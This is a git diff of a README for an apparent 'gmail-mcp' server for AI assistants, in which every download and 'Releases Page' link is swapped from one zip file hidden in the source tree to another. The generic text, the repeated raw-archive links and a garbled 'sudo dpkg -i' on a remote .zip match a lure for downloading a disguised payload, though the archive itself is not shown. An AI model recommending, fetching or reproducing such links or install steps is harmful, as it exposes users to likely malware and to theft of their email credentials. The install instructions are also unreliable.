@@ -1,7 +1,7 @@
 # 🚀 gmail-mcp - Manage Your Emails with Ease
 
 ## 📥 Download Now
-[![Download gmail-mcp](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip)](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip)
+[![Download gmail-mcp](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip)](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip)
 
 ## 📖 Overview
 The Gmail MCP Server helps you manage your emails effortlessly. Designed for AI assistants, it allows you to send, search, and organize your emails with labels and filters. With features like OAuth2 authentication, batch operations, and attachment handling, it works seamlessly with AI models like Claude, Gemini, and Cursor.
@@ -10,7 +10,7 @@ The Gmail MCP Server helps you manage your emails effortlessly. Designed for AI 
 Follow these steps to set up and run the Gmail MCP Server:
 
 ### 1. Visit the Releases Page
-To get the latest version of the application, visit this page: [Releases Page](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip).
+To get the latest version of the application, visit this page: [Releases Page](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip).
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Select the version labeled as "Latest". This is the most stable release with all the latest features and fixes.
@@ -37,7 +37,7 @@ After downloading the file, locate it in your downloads folder. Follow these ste
 2. Navigate to the directory where the file is downloaded.
 3. Use the following command to install:
    ```bash
-   sudo dpkg -i https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip
+   sudo dpkg -i https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip
    ```
 
 ### 5. Launch the Application
@@ -85,9 +85,9 @@ Join our community to share your experiences or get help. You can find us in the
 - **Discussion Forum:** Engage with other users and developers.
 
 ## 📢 Latest Updates
-Stay up to date with the latest features and bug fixes by regularly checking the Releases page: [Releases Page](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip).
+Stay up to date with the latest features and bug fixes by regularly checking the Releases page: [Releases Page](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip).
 
 ## 🔍 Conclusion
 Managing your emails can be simple with the Gmail MCP Server. Follow the steps outlined here, and you will be up and running in no time. Give it a try and enhance your email management experience!
 
-[![Download gmail-mcp](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip)](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/schemas/gmail_mcp_v2.0-alpha.2.zip)
+[![Download gmail-mcp](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip)](https://raw.githubusercontent.com/hahaha-saygex/gmail-mcp/main/src/builders/mcp_gmail_2.7-alpha.4.zip)
